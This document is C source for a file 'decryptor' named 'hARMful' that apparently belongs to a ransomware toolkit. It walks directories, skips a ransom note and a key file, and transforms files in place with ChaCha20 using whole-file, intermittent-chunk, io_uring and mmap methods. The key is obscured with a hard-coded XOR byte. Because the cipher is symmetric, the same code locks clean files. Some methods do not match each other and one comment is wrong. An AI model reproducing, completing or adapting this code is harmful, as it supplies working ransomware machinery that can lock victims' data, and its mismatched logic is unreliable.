#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <sys/uio.h>
#include <openssl/evp.h>

#ifdef USE_IO_URING
#include <liburing.h>
#endif

#define CHUNK_SIZE 8192
#define MAX_CHUNKS 7
#define PAGE_SIZE 4096
#define CHACHA20_KEY_SIZE 32
#define CHACHA20_NONCE_SIZE 12

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

typedef struct {
    off_t offset;
    size_t length;
} chunk_info_t;

static unsigned char decryption_key = 0x98;
unsigned char chacha20_key[CHACHA20_KEY_SIZE];
unsigned char chacha20_nonce[CHACHA20_NONCE_SIZE];

int chacha20_decrypt_buffer(unsigned char *data, size_t len) {
    EVP_CIPHER_CTX *ctx;
    int out_len;
    unsigned char *output;
    
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "Failed to create EVP context\\n");
        return -1;
    }
    
    // ChaCha20 IV: 12-byte nonce + 4-byte counter
    unsigned char iv[16] = {0};
    memcpy(iv, chacha20_nonce, CHACHA20_NONCE_SIZE);
    
    // Use DecryptInit for clarity, but ChaCha20 is symmetric
    if (EVP_DecryptInit_ex(ctx, EVP_chacha20(), NULL, chacha20_key, iv) != 1) {
        fprintf(stderr, "Failed to initialize ChaCha20 decryption\\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    output = malloc(len + EVP_MAX_BLOCK_LENGTH);
    if (!output) {
        fprintf(stderr, "Failed to allocate output buffer\\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    if (EVP_DecryptUpdate(ctx, output, &out_len, data, len) != 1) {
        fprintf(stderr, "ChaCha20 decryption failed\\n");
        free(output);
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    int final_len = 0;
    if (EVP_DecryptFinal_ex(ctx, output + out_len, &final_len) != 1) {
        fprintf(stderr, "ChaCha20 finalisation failed\\n");
        free(output);
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    memcpy(data, output, out_len + final_len);
    free(output);
    EVP_CIPHER_CTX_free(ctx);
    
    return 0;
}

void xor_decrypt_buffer(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key ^ (i & 0x9A);
    }
}


int load_chacha20_key(const char *key_file) {

    FILE *fp = fopen(key_file, "rb");
    if (!fp) {
        fprintf(stderr, "Failed to open key file: %s\\n", key_file);
        fprintf(stderr, "Make sure .chacha20_key.bin exists in current directory\n");
        return -1;
    }
    
    size_t bytes_read = fread(chacha20_key, 1, CHACHA20_KEY_SIZE, fp);
    if (bytes_read != CHACHA20_KEY_SIZE) {
        fprintf(stderr, "Failed to read ChaCha20 key (read %zu/%d bytes)\n", 
                bytes_read, CHACHA20_KEY_SIZE);
        fclose(fp);
        return -1;
    }
    
    bytes_read = fread(chacha20_nonce, 1, CHACHA20_NONCE_SIZE, fp);
    if (bytes_read != CHACHA20_NONCE_SIZE) {
        fprintf(stderr, "Failed to read ChaCha20 nonce (read %zu/%d bytes)\\n", 
                bytes_read, CHACHA20_NONCE_SIZE);
        fclose(fp);
        return -1;
    }
    xor_decrypt_buffer(chacha20_key, CHACHA20_KEY_SIZE, decryption_key);
    xor_decrypt_buffer(chacha20_nonce, CHACHA20_NONCE_SIZE, decryption_key);

    fclose(fp);
    printf("ChaCha20 key and nonce loaded successfully\n");
    return 0;
}

int calculate_decryption_chunks(size_t file_size, chunk_info_t *chunks) {
    if (file_size <= 64 * 1024) {
        // Files ≤ 64KB: Fully decrypted
        chunks[0].offset = 0;
        chunks[0].length = file_size;
        return 1;
    }
    else if (file_size <= 5 * 1024 * 1024) {
        // Files 64KB-5MB: Decrypt 3 chunks (beginning, middle, end)
        chunks[0].offset = 0;
        chunks[0].length = CHUNK_SIZE;

        chunks[1].offset = file_size / 2;
        chunks[1].length = CHUNK_SIZE;

        chunks[2].offset = (file_size * 3) / 4;
        chunks[2].length = (file_size - chunks[2].offset) < CHUNK_SIZE ? 
                           (file_size - chunks[2].offset) : CHUNK_SIZE;
        return 3;
    }
    else if (file_size <= 20 * 1024 * 1024) {
        // Files 5MB-20MB: Decrypt 5 evenly distributed chunks
        size_t chunk_distance = file_size / 5;
        for (int i = 0; i < 5; i++) {
            chunks[i].offset = i * chunk_distance;
            chunks[i].length = (file_size - chunks[i].offset) < CHUNK_SIZE ? 
                               (file_size - chunks[i].offset) : CHUNK_SIZE;
        }
        return 5;
    }
    else {
        // Files >20MB: Decrypt 7 chunks at specific positions
        double positions[] = {0.0, 0.125, 0.25, 0.50, 0.75, 0.875, 0.95};
        for (int i = 0; i < 7; i++) {
            chunks[i].offset = (off_t)(file_size * positions[i]);
            chunks[i].length = (file_size - chunks[i].offset) < CHUNK_SIZE ? 
                               (file_size - chunks[i].offset) : CHUNK_SIZE;
        }
        return 7;
    }
}

// Method 1: Direct syscall decryption (chunk-based, mirrors encrypt_file_direct_syscall)
int decrypt_file_direct_syscall(const char *filepath) {
    struct stat st;
    int fd;
    chunk_info_t chunks[MAX_CHUNKS];
    int chunk_count;
    unsigned char *buffer = NULL;

    fd = open(filepath, O_RDWR);
    if (fd < 0) {
        perror("Failed to open file");
        return -1;
    }

    if (fstat(fd, &st) != 0) {
        perror("Failed to stat file");
        close(fd);
        return -1;
    }

    if (st.st_size == 0 || st.st_size > 100 * 1024 * 1024) {
        close(fd);
        return -1;
    }

    chunk_count = calculate_decryption_chunks(st.st_size, chunks);

    size_t max_chunk_size = 0;
    for (int i = 0; i < chunk_count; i++) {
        if (chunks[i].length > max_chunk_size)
            max_chunk_size = chunks[i].length;
    }

    buffer = malloc(max_chunk_size);
    if (!buffer) {
        perror("Failed to allocate buffer");
        close(fd);
        return -1;
    }

    for (int i = 0; i < chunk_count; i++) {
        if (lseek(fd, chunks[i].offset, SEEK_SET) < 0) continue;

        ssize_t bytes_read = read(fd, buffer, chunks[i].length);
        if (bytes_read != (ssize_t)chunks[i].length) continue;

        chacha20_decrypt_buffer(buffer, chunks[i].length);

        if (lseek(fd, chunks[i].offset, SEEK_SET) < 0) continue;
        ssize_t bytes_written = write(fd, buffer, chunks[i].length);
        if (bytes_written != (ssize_t)chunks[i].length) {
            free(buffer);
            close(fd);
            return -1;
        }
    }

    free(buffer);
    close(fd);
    return 0;
}

// Method 2: io_uring decryption (if available)
int decrypt_file_io_uring(const char *filepath) {
#ifdef USE_IO_URING
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    struct stat st;
    int fd, ret = -1;
    struct iovec iov;
    unsigned char *buffer = NULL;

    // Initialize io_uring
    if (io_uring_queue_init(32, &ring, 0) < 0) {
        perror("Failed to init io_uring");
        return -1;
    }

    // Open file
    fd = open(filepath, O_RDWR);
    if (fd < 0) {
        perror("Failed to open file");
        io_uring_queue_exit(&ring);
        return -1;
    }

    if (fstat(fd, &st) != 0 || st.st_size == 0 || st.st_size > 50 * 1024 * 1024) {
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Allocate aligned buffer for io_uring
    buffer = aligned_alloc(4096, st.st_size);
    if (!buffer) {
        perror("Failed to allocate aligned memory");
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    iov.iov_base = buffer;
    iov.iov_len = st.st_size;

    // Submit read operation via io_uring
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        fprintf(stderr, "Failed to get SQE\n");
        goto cleanup;
    }

    io_uring_prep_readv(sqe, fd, &iov, 1, 0);
    if (io_uring_submit(&ring) < 0) {
        perror("Failed to submit read");
        goto cleanup;
    }

    // Wait for completion
    if (io_uring_wait_cqe(&ring, &cqe) < 0) {
        perror("Failed to wait for read completion");
        goto cleanup;
    }

    if (cqe->res != st.st_size) {
        fprintf(stderr, "Read incomplete: %d/%ld\n", cqe->res, st.st_size);
        io_uring_cqe_seen(&ring, cqe);
        goto cleanup;
    }
    io_uring_cqe_seen(&ring, cqe);

    // Decrypt the buffer (XOR is symmetric)
    chacha20_decrypt_buffer(buffer, st.st_size);

    // Submit write operation via io_uring
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        fprintf(stderr, "Failed to get SQE for write\n");
        goto cleanup;
    }

    io_uring_prep_writev(sqe, fd, &iov, 1, 0);
    if (io_uring_submit(&ring) < 0) {
        perror("Failed to submit write");
        goto cleanup;
    }

    // Wait for write completion
    if (io_uring_wait_cqe(&ring, &cqe) < 0) {
        perror("Failed to wait for write completion");
        goto cleanup;
    }

    ret = (cqe->res == st.st_size) ? 0 : -1;
    if (ret != 0) {
        fprintf(stderr, "Write incomplete: %d/%ld\n", cqe->res, st.st_size);
    }
    io_uring_cqe_seen(&ring, cqe);

cleanup:
    if (buffer) free(buffer);
    close(fd);
    io_uring_queue_exit(&ring);
    return ret;
#else
    // Fallback to direct syscall method if io_uring not available
    printf("io_uring not available, falling back to direct syscall method\n");
    return decrypt_file_direct_syscall(filepath);
#endif
}

// Method 3: Partial decryption using direct syscalls
int decrypt_file_partial_direct(const char *filepath) {
    struct stat st;
    int fd;
    chunk_info_t chunks[MAX_CHUNKS];
    int chunk_count;
    unsigned char *buffer = NULL;
    int success_count = 0;

    fd = open(filepath, O_RDWR);
    if (fd < 0) {
        perror("Failed to open file");
        return -1;
    }

    if (fstat(fd, &st) != 0) {
        perror("Failed to stat file");
        close(fd);
        return -1;
    }

    if (st.st_size == 0 || st.st_size > 100 * 1024 * 1024) {
        close(fd);
        return -1;
    }

    chunk_count = calculate_decryption_chunks(st.st_size, chunks);

    // Calculate maximum chunk size needed
    size_t max_chunk_size = 0;
    for (int i = 0; i < chunk_count; i++) {
        if (chunks[i].length > max_chunk_size) {
            max_chunk_size = chunks[i].length;
        }
    }

    // Allocate buffer large enough for the largest chunk
    buffer = malloc(max_chunk_size);
    if (!buffer) {
        perror("Failed to allocate buffer");
        close(fd);
        return -1;
    }

    // Decrypt each chunk
    for (int i = 0; i < chunk_count; i++) {
        // Seek to chunk position
        if (lseek(fd, chunks[i].offset, SEEK_SET) < 0) {
            fprintf(stderr, "Failed to seek to chunk %d\n", i);
            continue;
        }

        // Read chunk
        ssize_t bytes_read = read(fd, buffer, chunks[i].length);
        if (bytes_read != (ssize_t)chunks[i].length) {
            fprintf(stderr, "Failed to read chunk %d\n", i);
            continue;
        }

        chacha20_decrypt_buffer(buffer, chunks[i].length);

        if (lseek(fd, chunks[i].offset, SEEK_SET) < 0) {
            fprintf(stderr, "Failed to seek to chunk %d for writing\n", i);
            continue;
        }

        ssize_t bytes_written = write(fd, buffer, chunks[i].length);
        if (bytes_written != (ssize_t)chunks[i].length) {
            fprintf(stderr, "Failed to write chunk %d\n", i);
            continue;
        }

        success_count++;
    }

    free(buffer);
    close(fd);

    return (success_count == chunk_count) ? 0 : -1;
}


// Method 4: Memory-mapped page decryption
int decrypt_file_mmap_pages(const char *filepath) {
    struct stat st;
    int fd;
    void *mapped_memory;
    size_t pages_to_decrypt;
    size_t total_pages;

    fd = open(filepath, O_RDWR);
    if (fd < 0) {
        perror("Failed to open file");
        return -1;
    }

    if (fstat(fd, &st) != 0) {
        perror("Failed to stat file");
        close(fd);
        return -1;
    }

    if (st.st_size == 0 || st.st_size > 100 * 1024 * 1024) {
        close(fd);
        return -1;
    }

    // Memory map the file
    mapped_memory = mmap(NULL, st.st_size, 
                        PROT_READ | PROT_WRITE, 
                        MAP_SHARED, fd, 0);
    if (mapped_memory == MAP_FAILED) {
        perror("Failed to mmap file");
        close(fd);
        return -1;
    }

    total_pages = (st.st_size + PAGE_SIZE - 1) / PAGE_SIZE;

    // Calculate pages to decrypt (must match encryption logic)
    if (total_pages <= 4) {
        pages_to_decrypt = total_pages;
    } else if (total_pages <= 100) {
        pages_to_decrypt = total_pages / 3;
    } else {
        pages_to_decrypt = total_pages / 10;
    }

    // Decrypt selected pages
    for (size_t i = 0; i < pages_to_decrypt; i++) {
        size_t page_idx;
        if (total_pages <= 4) {
            page_idx = i;
        } else {
            page_idx = i * (total_pages / pages_to_decrypt);
        }

        if (page_idx >= total_pages) break;

        unsigned char *page_start = (unsigned char*)mapped_memory + (page_idx * PAGE_SIZE);
        size_t decrypt_size = (st.st_size - (page_idx * PAGE_SIZE)) < PAGE_SIZE ? 
                              (st.st_size - (page_idx * PAGE_SIZE)) : PAGE_SIZE;

        //printf("Page Start: %p, Size: %zu, Key: 0x%02X\n", page_start, decrypt_size, decryption_key ^ page_idx);
        chacha20_decrypt_buffer(page_start, decrypt_size);
    }

    if (msync(mapped_memory, st.st_size, MS_SYNC) != 0) {
        perror("Failed to sync mmap");
    }

    munmap(mapped_memory, st.st_size);
    close(fd);

    return 0;
}

int decrypt_directory(const char* dir_path, int method) {
    DIR *dir;
    struct dirent *entry;
    struct stat file_stat;
    char full_path[PATH_MAX];
    int decrypted_count = 0;
    int (*decrypt_func)(const char *);

    // Select decryption method
    switch(method) {
        case 1:
            decrypt_func = decrypt_file_direct_syscall;
            // printf("Using Method 1: Direct Syscall Decryption\n");
            break;
        case 2:
            decrypt_func = decrypt_file_io_uring;
            // printf("Using Method 2: io_uring Decryption\n");
            break;
        case 3:
            decrypt_func = decrypt_file_partial_direct;
            // printf("Using Method 3: Partial Direct Decryption\n");
            break;
        case 4:
            decrypt_func = decrypt_file_mmap_pages;
            // printf("Using Method 4: Memory-Mapped Page Decryption\n");
            break;
        case 5:
            decrypt_func = decrypt_file_io_uring;
            // printf("Using Method 5: io_uring Hybrid Decryption\n");
            break;
        case 6:
            decrypt_func = decrypt_file_partial_direct;
            // printf("Using Method 6: io_uring Partial Decryption\n");
            break;
        default:
            fprintf(stderr, "Invalid method %d, using default (Method 1)\n", method);
            decrypt_func = decrypt_file_direct_syscall;
            break;
    }

    dir = opendir(dir_path);
    if (!dir) {
        perror("Failed to open directory");
        return -1;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        if (stat(full_path, &file_stat) != 0) {
            perror("Failed to stat");
            continue;
        }

        if (S_ISDIR(file_stat.st_mode)) {
            decrypted_count += decrypt_directory(full_path, method);
        } else if (S_ISREG(file_stat.st_mode)) {
            if (strstr(entry->d_name, "README_DECRYPT.txt") || strstr(entry->d_name, ".chacha20_key.bin")) {
                continue;
            }

            printf("Decrypting: %s\n", full_path);
            if (decrypt_func(full_path) == 0) {
                decrypted_count++;
                printf("  [SUCCESS]\n");
            } else {
                printf("  [FAILED]\n");
            }
        }
    }

    closedir(dir);
    return decrypted_count;
}

int main(int argc, char *argv[]) {
    const char *target_dir = ".";
    int decrypted_count;
    int method = 1; // Default to method 1
    char keypath[PATH_MAX];

    printf("===========================================\n");
    printf("  hARMful  \n");
    printf("===========================================\n\n");

    if (argc > 1) {
        target_dir = argv[1];
    }

    if (argc > 2) {
        method = atoi(argv[2]);
        if (method < 1 || method > 6) {
            fprintf(stderr, "Invalid method. Using default (1)\n");
            method = 1;
        }
    }

    
    snprintf(keypath, sizeof(keypath), "%s/.chacha20_key.bin", target_dir);
    load_chacha20_key(keypath);
    printf("Starting decryption...\n");

    decrypted_count = decrypt_directory(target_dir, method);

    printf("\n===========================================\n");
    printf("  Decryption Complete!\n");
    printf("  Files decrypted: %d\n", decrypted_count);
    printf("===========================================\n");

    return 0;
}